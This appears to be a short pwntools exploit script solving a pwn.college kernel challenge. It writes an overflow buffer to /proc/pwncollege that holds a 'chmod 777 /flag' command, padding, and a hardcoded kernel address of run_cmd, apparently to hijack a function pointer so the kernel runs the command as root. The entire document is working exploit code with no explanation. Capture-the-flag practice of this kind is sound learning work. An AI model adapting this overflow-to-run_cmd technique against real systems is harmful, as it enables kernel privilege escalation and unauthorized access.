# 0xffffffff81089b30 t run_cmd

from pwn import *
import os
import fcntl

context.arch = "amd64"
byte_codes = b"/run/workspace/bin/chmod 777 /flag\x00"
byte_codes += b"A"*(256-len(byte_codes))
byte_codes +=0xffffffff81089b30.to_bytes(8, "little")

fd = os.open("/proc/pwncollege", 2)

os.write(fd, byte_codes)

os.close(fd)